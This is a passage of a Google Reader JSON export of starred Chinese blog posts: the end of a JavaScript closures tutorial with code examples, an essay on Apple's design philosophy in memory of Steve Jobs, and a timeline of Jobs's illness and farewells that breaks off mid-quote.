href=\"http://blog.morrisjohns.com/javascript_closures_for_dummies.html\">JavaScript Closures For Dummies(</a><a href=\"http://web.archive.org/web/20080209105120/http://blog.morrisjohns.com/javascript_closures_for_dummies\">镜像</a><a href=\"http://blog.morrisjohns.com/javascript_closures_for_dummies.html\">)</a>。<br>\n<strong>例子1:闭包中局部变量是引用而非拷贝</strong></p>\n<pre>\nfunction say667() {\n    // Local variable that ends up within closure\n    var num = 666;\n    var sayAlert = function() { alert(num); }\n    num++;\n    return sayAlert;\n}\n\nvar sayAlert = say667();\nsayAlert()\n</pre>\n<p>因此执行结果应该弹出的667而非666。</p>\n<p><strong>例子2：多个函数绑定同一个闭包，因为他们定义在同一个函数内。</strong></p>\n<pre>\nfunction setupSomeGlobals() {\n    // Local variable that ends up within closure\n    var num = 666;\n    // Store some references to functions as global variables\n    gAlertNumber = function() { alert(num); }\n    gIncreaseNumber = function() { num++; }\n    gSetNumber = function(x) { num = x; }\n}\nsetupSomeGlobals(); // 为三个全局变量赋值\ngAlertNumber(); //666\ngIncreaseNumber();\ngAlertNumber(); // 667\ngSetNumber(12);//\ngAlertNumber();//12\n</pre>\n<p><strong>例子3：当在一个循环中赋值函数时，这些函数将绑定同样的闭包</strong></p>\n<pre>\nfunction buildList(list) {\n    var result = [];\n    for (var i = 0; i &lt; list.length; i++) {\n        var item = &#39;item&#39; + list[i];\n        result.push( function() {alert(item + &#39; &#39; + list[i])} );\n    }\n    return result;\n}\n\nfunction testList() {\n    var fnlist = buildList([1,2,3]);\n    // using j only to help prevent confusion - could use i\n    for (var j = 0; j &lt; fnlist.length; j++) {\n        fnlist[j]();\n    }\n}\n</pre>\n<p>testList的执行结果是弹出item3 undefined窗口三次，因为这三个函数绑定了同一个闭包，而且item的值为最后计算的结果，但是当i跳出循环时i值为4，所以list[4]的结果为undefined.</p>\n<p><strong>例子4：外部函数所有局部变量都在闭包内，即使这个变量声明在内部函数定义之后。</strong></p>\n<pre>\nfunction sayAlice() {\n    var sayAlert = function() { alert(alice); }\n    // Local variable that ends up within closure\n    var alice = 'Hello Alice';\n    return sayAlert;\n}\nvar helloAlice=sayAlice();\nhelloAlice();\n</pre>\n<p>执行结果是弹出”Hello Alice”的窗口。即使局部变量声明在函数sayAlert之后，局部变量仍然可以被访问到。</p>\n<p><strong>例子5：每次函数调用的时候创建一个新的闭包</strong></p>\n<pre>\nfunction newClosure(someNum, someRef) {\n    // Local variables that end up within closure\n    var num = someNum;\n    var anArray = [1,2,3];\n    var ref = someRef;\n    return function(x) {\n        num += x;\n        anArray.push(num);\n        alert('num: ' + num +\n        '\\nanArray ' + anArray.toString() +\n        '\\nref.someVar ' + ref.someVar);\n    }\n}\nclosure1=newClosure(40,{someVar:'closure 1'});\nclosure2=newClosure(1000,{someVar:'closure 2'});\n\nclosure1(5); // num:45 anArray[1,2,3,45] ref:'someVar closure1'\nclosure2(-10);// num:990 anArray[1,2,3,990] ref:'someVar closure2'\n</pre>\n<h4><strong><span style=\"color:#008000\">闭包的应用</span></strong></h4>\n<p><strong>Singleton 单件：</strong></p>\n<pre>\nvar singleton = function () {\n    var privateVariable;\n    function privateFunction(x) {\n        ...privateVariable...\n    }\n\n    return {\n        firstMethod: function (a, b) {\n            ...privateVariable...\n        },\n        secondMethod: function (c) {\n            ...privateFunction()...\n        }\n    };\n}();\n</pre>\n<p>这个单件通过闭包来实现。通过闭包完成了私有的成员和方法的封装。匿名主函数返回一个对象。对象包含了两个方法，方法1可以方法私有变量，方法2访问内部私有函数。需要注意的地方是匿名主函数结束的地方的’()’，如果没有这个’()’就不能产生单件。因为匿名函数只能返回了唯一的对象，而且不能被其他地方调用。这个就是利用闭包产生单件的方法。</p>\n<h2><strong><span style=\"color:#008000\">参考：</span></strong></h2>\n<p><a href=\"http://blog.morrisjohns.com/javascript_closures_for_dummies.html\">JavaScript Closures For Dummies(</a><a href=\"http://web.archive.org/web/20080209105120/http://blog.morrisjohns.com/javascript_closures_for_dummies\">镜像</a><a href=\"http://blog.morrisjohns.com/javascript_closures_for_dummies.html\">)</a> 可惜都被墙了。<br>\n<a href=\"http://yuiblog.com/blog/2006/11/27/video-crockford-advjs/\">Advance Javascript</a> （Douglas Crockford 大神的视频，一定要看啊）</p>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"再谈javascript面向对象编程 \" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6668.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6731.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/02/27/16161591.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">再谈javascript面向对象编程 </font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Javascript 面向对象编程\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6441.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6731.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Javascript 面向对象编程</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Javascript的两本书\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1608.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6731.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437626.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Javascript的两本书</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"20个优秀的Javascript导航技术\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F918.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6731.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">20个优秀的Javascript导航技术</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"一段Javascript的代码\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3540.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F6731.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">一段Javascript的代码</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2012年02月27日 -- <a href=\"http://coolshell.cn/articles/6668.html\" title=\"再谈javascript面向对象编程 \">再谈javascript面向对象编程 </a></li><li>2012年01月09日 -- <a href=\"http://coolshell.cn/articles/6441.html\" title=\"Javascript 面向对象编程\">Javascript 面向对象编程</a></li><li>2011年08月15日 -- <a href=\"http://coolshell.cn/articles/5202.html\" title=\"对象的消息模型\">对象的消息模型</a></li><li>2011年12月07日 -- <a href=\"http://coolshell.cn/articles/6043.html\" title=\"Web开发中需要了解的东西\">Web开发中需要了解的东西</a></li><li>2011年11月24日 -- <a href=\"http://coolshell.cn/articles/5537.html\" title=\"一些文章资源和趣闻\">一些文章资源和趣闻</a></li><li>2011年10月31日 -- <a href=\"http://coolshell.cn/articles/5709.html\" title=\"API设计：用流畅接口构造内部DSL\">API设计：用流畅接口构造内部DSL</a></li><li>2011年07月21日 -- <a href=\"http://coolshell.cn/articles/5035.html\" title=\"面向对象的Shell脚本\">面向对象的Shell脚本</a></li></ul>"
    },
    "author" : "Neo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1318397070123",
    "timestampUsec" : "1318397070123516",
    "id" : "tag:google.com,2005:reader/item/608a6a06a8762855",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT评古论今", "随便" ],
    "title" : "Think different &amp; be yourself 缅怀乔布斯",
    "published" : 1317980741,
    "updated" : 1318005504,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/10/07/think_different_be_yourself.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>同时用此文参加imeigu的征文，首先发在imeigu: <a href=\"http://my.imeigu.com/5579705651/20416146\">http://my.imeigu.com/5579705651/20416146</a></p>\n\n<p>另外，arthur369 也写了 <a href=\"http://blog.xiqiao.info/2011/10/07/1110\">Apple产品的美学特征 ──缅怀乔布斯</a><br>\n---------------------------------------------</p>\n\n<p>关于苹果几乎每天都在有人谈及，分析苹果的文章也四处都是，在这里我想写一些不一样的，这些在我看来更接近苹果精神的。这些精神我认为源自乔布斯，在前面的许多年中也只有他能守护，以他那种被八卦周刊们称做\"人品差\"（其实我很怀疑这只是因为他对记者和媒体太不友好，大家玩命黑他）的那种独裁、固执的方式守护。在苹果公司网站上缅怀乔布斯的文字中，最后一句是\"Steve留下了一家唯有他才能创建的企业\"，正是如此。</p>\n\n<p>苹果不是奢侈品，这一点经常被误传。当然苹果产品确实不便宜，但考虑其质量，往往是市场上能买到最划算的。苹果并不想做市场上最便宜的产品，价格战是最落后的方式，找到理念相合的用户群，并扩大之，这才是好的竞争方式。这个战略在今天看来非常成功，因为电子产品整体成本下降很多，生产成本也下降很多（感谢中国的世界工厂），而经济比90年代有大幅增长，这让现在的苹果产品看起来更容易接受了。在80年代苹果最糟糕的日子里面，这个策略不成功，x86架构的廉价计算机比精心设计的苹果实在便宜太多了，所以更受欢迎。对比当年，今天看来一台苹果笔记本和其他品牌的价格差距更容易被人们接受，而苹果产品细致美观让人们更接受这点价格差距。</p>\n\n<p>不指望做最便宜的产品，才能做出来好的产品。因为一些努力都有对应的成本，尤其是硬件产品。但对应价格的产品质量必须要足够好。苹果产品关注细节，这些细节可能不会被用户非常直接感受到，但总体上会给人舒服的感觉。人的感官比我们所知道的更精细，一些我们并没有注意到的细节会改变最终感受。这种变态追求细节体现在所有地方，当你放大苹果软件和系统中的图标，通常会能感受到变态的细致。比如Mail程序图标上的邮戳，放大之后可以看到HELLO FROM CUPERTINO CA字样，这是来自苹果总部所在地的问候，放大Java设置的图标，你能看到咖啡杯图标中靠近边缘的气泡，正如我们在现实中的一杯真正的咖啡，放大Document Set图标，会看到那一摞书的书脊上都有书名。就算是在今天，苹果各种理念已经深入人心，在非苹果平台上也很难找到如此精细的产品。而人们平时并不太注意这些精细，只是觉得很舒服。这些成本花费是否有意义？我想答案是确定的，这就是乔布斯挑剔精神的体现。好的产品不应该让人能轻松列出各种好处，而是成为一个整体让人感觉很舒服。对于一个不那么特立独行和偏执的企业，降低成本始终是大事（想想现在的丰田汽车就明白了），能够不再乎成本一心追求产品质量，在这个时代已经是非常不容易。如果不是乔布斯这样偏执而天才的领导人，对于职业经理人来说，恐怕难以下定如此决心，更难获得董事会支持。</p>\n\n<p><img src=\"http://blog.devep.net/virushuo/upload/images/mail_icon.png\"></p>\n\n<p><img src=\"http://blog.devep.net/virushuo/upload/images/javapreferences_icon.png\"></p>\n\n<p><img src=\"http://blog.devep.net/virushuo/upload/images/javapreferences_icon_big.png\"></p>\n\n<p>苹果产品并不完美，甚至有很多功能缺失。经常会有人对我说，你看苹果没有这个功能，没有那个功能。苹果的理念之一就是如果这个功能不能完美解决，那么就干脆砍掉，如果不能完美升级，那么干脆保持原状。这又是一个和传统观念相悖的做法，一般人们会认为\"不完善比没有强\"，苹果彻底相反，不完善不如干脆没有。这种理念带来的好处是简化了复杂度，复杂度又和时间相关，按照这样的理念，控制功能需求，就可以在固定时间内提供完成度更好的产品。对于现代软件工程和硬件工程，最大的问题是复杂度难以控制，而难以控制的复杂度会导致产品研发周期变长，投入成本不可控，随后在量产过程，售后支持环节都带来更多不可预测的成本支出。做减法简直是必须的，但大家都知道做减法很难。从苹果的历史看来，乔布斯一直擅长做这件事，不仅在产品上，在企业管理上也一样。他回归苹果之后，在很短时间内砍掉大量非核心业务，让公司终于能顺利生存。随后集中精力在iPod，对于一个制造计算机和服务器的公司，专心去做一个MP3播放器，听起来很可笑，当时也有很多人甚至员工认为很可笑。这个MP3也没有什么伟大创新，只是更好用。最终这个产品成功了，随后才有今天的一切。</p>\n\n<p>今天的苹果产品仍然这样，想想iPhone刚刚出世时，人们诟病什么？不能复制粘贴，单任务，不支持\"流行的\"Flash，不能换电池...，其实到今天还可以随便找出来iPhone一堆缺点。就算这些缺点存在，苹果的产品仍然变得流行，人们喜欢他们，而不太在意这些缺点，因为苹果提供了更重要的东西，大屏幕，多点触摸，传感器，一个真正的浏览器，方便的音乐播放和购买，优美坚固的外形...我们今天回头来看这些诟病，几乎都能揣测出来一些道理，单任务是因为硬件性能不够，无法保证流畅切换任务和并行运行（想想同时代的nokia多任务），不支持Flash是因为太消耗性能，不能换电池是因为增加可换电池仓增加成本和设计难度...能做这样的减法，不仅需要对用户和市场有足够了解，也需要对开发产品团队和供应链有足够了解。否则他怎么能知道什么可以减少，什么可以在未来版本中支持，什么永不妥协，什么必不可少？这些，乔布斯做到了。在功能、成本、时间中的妥协，寻找平衡，这是伟大的艺术。</p>\n\n<p>我更愿意把乔布斯看作艺术家和精神领袖，他不是工程师也不是Geek。苹果从来不用复杂的名词描述产品，苹果的产品系列也很简单。你只需选择笔记本的尺寸，随后就只有高低两种配置，你无需了解手机的CPU，你只需选择存储大一点或小一点。在买苹果产品这件事上，用户只要知道自己想要什么就可以完成，而无需成为专家。在其他领域你可没这么幸运，无论是买计算机，买手机，买汽车买房子装修，在苹果之外的任何产品，你都先要把自己变成专家，然后才能选出来你需要的东西。简单就是美。简单的精神有体现在苹果的各处，无论是使用产品还是使用网站，获得支持还是培训，都很简单。甚至苹果的发布会，开发者会议，演讲者都使用简单的语言。有朋友笑称去参加苹果会议不用怕英语不好，他们用的单词都是初中生也能听懂的。除了少数Geek用户和专业用户，大多数人更愿意使用简单的东西。不仅在硬件上，软件也一样。在苹果系统中，不用考虑硬盘分区，只需按照用途放在对应目录即可，不用创建复杂的层叠目录用来存放文件，只需搜索即可。这种简单同样体现在苹果提供的网站服务上，iTunes Music Store发布于唱片工业和盗版战争最激烈的时代，那时候P2P下载音乐已经非常普及，多数人不太在意音质，他们会下载MP3然后刻成CD放在车上听（中国共享软件的前辈周奕在网上把MP3刻录CD软件卖给美国用户，赚了大钱）。iTunes Music Store提供了简单的界面，购买方式，简单的价格体系和使用规则，一上线就受到欢迎，前18小时卖掉了275,000 首，前5天卖掉1,000,000首，这个成绩证明了只要足够方便简单，用户愿意付钱购买音乐，几年之后他们更是干脆连DRM保护都去掉了（感谢EMI的大胆尝试），最终成就了今天最大的数字影音产品购买市场，这个辉煌延续到了今天的AppStore。在未来iCloud发布之后，你甚至可以把自己下载的MP3通过Match服务，交很少的钱，一次购买版权，这也足够简单吧？我相信多数人愿意花这笔钱。如何让产品变得简单，如何让一般人更容易理解，这是乔布斯擅长的。对比前几天的iPhone 4S发布会Tim Cook的演讲，是否觉得不如以往乔布斯演讲那么通俗易懂？Tim还没能和乔布斯一样驾驭内容，让演讲做沟通一般用户和产品的桥梁，他还需要更多时间。</p>\n\n<p>乔布斯不是技术专家，也不是工程专家，但他有选择好的技术产品的能力。这也是一个卓越公司领导人必备的能力。在离开苹果，创建NeXT那段时期中，他奠定了今天苹果的技术基础。几个重要技术关头，他都选中了最好的产品，比如，操作系统上拥抱UNIX，这样才有之后转向Intel CPU的能力，也有了iOS使用ARM的能力，开发工具使用了Objective-C，当时的潮流是C++，今天在iOS和OS X开发上，我们亲自体验到了采用Objective-C而不是C++的好处，再比如选择在KHTML基础上创建webkit做为浏览器内核，今天移动设备上webkit已经成了浏览器的标准内核，android浏览器也同样基于此。更底层的还有放弃GCC投资LLVM编译器，这样给予开发者更多特性，帮助他们完成质量更高的应用。最重要的系统和开发工具是在距离今天非常遥远90年代初，在乔布斯离开苹果开办NeXT时做出的选择，实在不得不佩服他超越时代的技术判断力与直觉。</p>\n\n<p>如果让我继续写下去，这篇文章还能写非常长。不过我决定就此结束。苹果的精神难以用语言阐述，需要用心体会。我的朋友 <a href=\"http://twitter.com/soulhacker\">@soulhacker</a>在twitter上<a href=\"http://twitter.com/soulhacker/status/122020940619067392\">说</a>\"我对 Steve Jobs 最感恩之处在于他无可辩驳的证明了：特立独行、理想主义、完美主义、执着创新是可以成功的，并用他自己的三段人生经历教给我们如何与实用主义及商业社会良好的妥协\"，这是我在这几天见到对苹果精神和乔布斯本人最好的概括。</p>\n\n<p>乔布斯的离去一定会对苹果造成影响，从艺术家乔布斯到供应链专家Tim，领导者角色的变化一定会影响到公司决策。但我相信这不会太坏，乔布斯的精神和气质通过他的产品，文档，技术影响着用户和开发者，对于苹果员工想必更是如此。特别是苹果那些和他一起工作了15年20年以上的核心员工，他们一定能将这些宝贵财富贯彻始终，并使之继续流传。苹果和乔布斯仍然有很多人们不知道的事情，那些想法和决策的产生，如何说服合作伙伴...这些恐怕只有在10月24日发布的乔布斯官方传记中才能得到答案了。</p>\n\n<p>在苹果的世界中，创新远未到终点，苹果在之前很多年投资了很多技术公司，包括这次我们见到的siri，还有传说到未见产品的液体金属 Liquidmetal Technologies ，终有一天，这些技术会足够成熟可用，变成产品到达我们面前，那一刻，我们的生活会再次随之改变，如同苹果宣传资料上最喜欢写的那句\"再一次，改变世界\"。苹果的疆域扩展也未到终点，我们能看到的领域还有一贯有积累的教育市场，完成了准备工作的企业市场，还有面对客厅的Apple TV。未来还很广阔也足够令人激动，做为开发者或者创业者，我们对乔布斯最好的纪念是记住Be youself，做你喜欢的事，做和其他人不一样的事，改变这个不完美的世界。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1318123937928",
    "timestampUsec" : "1318123937928146",
    "id" : "tag:google.com,2005:reader/item/82ae0875d90c6aa5",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "World" ],
    "title" : "乔布斯的告别",
    "published" : 1317999441,
    "updated" : 1317999441,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/10/steve_jobs_farewell.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>斯蒂夫·乔布斯活着的时候，对病情讳莫如深，外界对他的身体状态毫不知情。</p><p>现在他去世了，根据各方面透露的信息，我们终于可以还原他的病历，了解像他这样伟人怎样对待生与死。</p>\n\n<p>1.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100701.jpg\"></p>\n\n<p>2000年5月，乔布斯在旧金山WWDC大会（苹果全球开发者大会）上，演示Mac OS X操作系统。这时，他的身体还是完全健康的。</p>\n\n<p>2.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100702.jpg\"></p>\n\n<p>2002年7月17日，乔布斯光临位于纽约Soho的苹果商店。此时，距离他病情确诊还有一年。</p>\n\n<p>3.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100703.jpg\"></p>\n\n<p>2003年1月，乔布斯在旧金山Macworld大会上，介绍新发布的17寸Powerbook。</p>\n\n<p>同年10月，在一次CT检查中，医生发现乔布斯的胰腺有一个肿瘤，但是属于恶性程度较低的癌症：胰岛细胞神经内分泌肿瘤。起初，乔布斯不愿接受手术，想通过饮食调整来控制病情。</p>\n\n<p>4.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100704.jpg\"></p>\n\n<p>2004年1月，乔布斯在旧金山Macworld大会上，介绍新型的iPod。此时，他已经知道自己患有胰腺癌，但是未对外界透露。</p>\n\n<p>2004年7月，由于病情没有得到控制，在坚持饮食疗法9个月后，乔布斯终于接受手术，摘除了肿瘤。8月1日，他首次对外公布病情，表示手术很成功，也不需要化疗或者放疗（另一种说法是，乔布斯本人坚持不要化疗和放疗）。</p>\n\n<p>5.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100705.jpg\"></p>\n\n<p>2004年10月，乔布斯与U2乐队成员Bono等人一起登台，庆祝苹果iPod发售。此时，他刚刚完成癌症手术三个月。</p>\n\n<p>6.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100706.jpg\"></p>\n\n<p>2005年1月，手术后半年，乔布斯展示Mac Mini个人电脑。</p>\n\n<p>7.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100707.jpg\"></p>\n\n<p>2006年8月，手术后两年，乔布斯在WWDC上发布演讲。苹果公司称，他的健康状况良好。</p>\n\n<p>8.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100708.jpg\"></p>\n\n<p>2007年1月，手术后两年半，乔布斯发布iPhone。</p>\n\n<p>9.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100709.jpg\"></p>\n\n<p>2008年6月，手术后第四年，乔布斯发布\"全球最薄笔记本电脑\"MacBook Air。他显得消瘦憔悴，但是苹果公司称，他只是受到\"常见细菌\"感染。事实上，现在我们知道，那时他的癌症已经复发，病情扩散到了肝脏。</p>\n\n<p>10.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100710.jpg\"></p>\n\n<p>2009年1月，苹果公司宣布乔布斯患上了\"荷尔蒙失衡症\"，将缺席本年度的WWDC。仅仅过了一周，乔布斯发表声明称，由于病情比原想的复杂，将病休5个月。事实上，此时他已经是重度癌症病人，肝脏布满了癌细胞。</p>\n\n<p>2009年4月，乔布斯在孟菲斯的卫理公会大学附属医院接受肝脏移植手术。院方透露，乔布斯在轮候换肝名单上属病情最严重者，因此当有适合肝脏，便第一时间为他进行移植手术。并说，当乔布斯换肝时，他的肝脏病情已到末期。手术后，乔布斯康复情况良好。</p>\n\n<p>11.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100711.jpg\"></p>\n\n<p>2010年1月27日，肝脏移植手术后九个月，乔布斯宣布推出平板电脑iPad。</p>\n\n<p>12.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100712.jpg\"></p>\n\n<p>2010年6月7日，肝脏移植手术后一年，乔布斯宣布推出iPhone 4。</p>\n\n<p>13.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100713.jpg\"></p>\n\n<p>2010年7月，乔布斯在新闻发布会上宣布，将免费提供胶套以解决iPhone 4信号接收问题。</p>\n\n<p>14.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100714.jpg\"></p>\n\n<p>2010年9月，在旧金山的一个音乐主题媒体活动上，乔布斯面带笑容。</p>\n\n<p>15.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100715.jpg\"></p>\n\n<p>2010年10月，乔布斯出席苹果公司活动时的照片，距离去世只剩一年。</p>\n\n<p>2011年1月17日：乔布斯在一封发给公司员工的电子邮件中宣布因个人健康原因将再次休假。他说，\"我是如此热爱苹果，我希望尽快返回公司。\"</p>\n\n<p>16.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100716.jpg\"></p>\n\n<p>2011年3月2日，正在休病假的乔布斯意外出席了iPad 2发布会，距离去世只剩半年。</p>\n\n<p>17.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201110/bg2011100717.jpg\"></p>\n\n<p>2011年6月6日，乔布斯在WWDC上发布iCloud服务，距离去世只剩4个月。这是乔布斯在公开场合的最后照片。</p>\n\n<p>2011年8月，乔布斯宣布辞去苹果公司CEO。</p>\n\n<p>2011年10月5日，乔布斯去世，终年56岁。</p>\n\n<p>==================================</p>\n\n<p>乔布斯去世后，<a href=\"http://www.nytimes.com/2011/10/07/technology/with-time-running-short-steve-jobs-managed-his-farewells.html\">《纽约时报》</a>的报道，透露了他临终前的一些细节。他的癌症复发是在2010年底发现的，所以乔布斯在2011年1月宣布病休。</p>\n\n<p>2011年2月，医生告诉乔布斯，已经没有治愈可能了，他的时间不多了。但是，乔布斯依然选择出席iPad 2和iCloud发布会，那时他其实已经知道自己将不久于人世。</p>\n\n<p>也是从那时起，乔布斯开始为自己的后事做安排。他选择会见一些老朋友，与他们告别。</p>\n\n<p>《华尔街日报》的莫博士，这样记录自己与乔布斯的<a href=\"http://tech.sina.com.cn/it/2011-10-06/13256143674.shtml\">会面</a>：</p>\n\n<blockquote>\n\n<p>\"我在他家待了三个小时，中间还到附近的公园走了一圈。虽然他的身体之差令我很担心，但是他坚持要去那里。\"</p>\n\n<p>\"他说他每天都走路锻炼，而且每天为自己定一个更远一点的目标。今天，社区公园就是他的目标。我们边走边谈，他突然停下来，看上去很痛苦。我央求他回家，因为我根本不懂急救术，万一出事了，第二天报纸标题就是《束手无策的记者眼睁睁看着乔布斯在路边死去》。\"</p>\n\n<p>\"乔布斯听了就笑了，拒绝回去。片刻之后，他继续向公园走去。我们坐在长椅上，谈起生活、家庭和各自的疾病（我几年前曾经突发心脏病）。他教导我健康的重要性。然后，我们就往回走了。\"</p>\n\n</blockquote>\n\n<p>2011年8月，乔布斯辞去苹果CEO的时候，他的身体已经彻底不行了，不可能有奇迹了。</p>\n\n<p>生命的最后几个星期，乔布斯非常虚弱，躺在家里，走路也走不动。他最后一次请了几个朋友----Ornish医生、风险投资家John Doerr、苹果公司董事Bill Campbell、迪斯尼公司执行长Robert A. Iger----在Palo Alto的Jin Sho餐馆举行告别宴。在宴会上，他还给即将发布的iPhone 4S出主意。</p>\n\n<p>Ornish医生回忆说：\"我问他，养育了四个孩子，对这件事他是否感到满意。他说，这比我做过的任何事都好上10000倍。\"</p>\n\n<p>乔布斯还见了他的传记作者Isaacson。后者问他，你如此重视隐私，为什么会授权我写你的传记。乔布斯回答：\"我希望我的孩子了解我。在他们成长过程中，我并没有一直在他们身边。我要他们知道为什么，并且理解我所做的事情。\"</p>\n\n<p>在他的弥留之际，他的妹妹Mona Simpson说：\"最后，他的语调充满了温柔的歉意，为离开我们前走一步，感到非常抱歉。\"</p>\n\n<p>==================================</p>\n\n<p>2005年，乔布斯在斯坦福大学毕业典礼上，曾经<a href=\"http://www.ruanyifeng.com/docs/speech/steve_jobs.html\">说过</a>：</p>\n\n<blockquote>\n\n<p><strong>\"我深信，保持前进的唯一动力，就是我热爱自己所做的事。\"</strong>（I'm convinced that the only thing that kept me going was that I loved what I 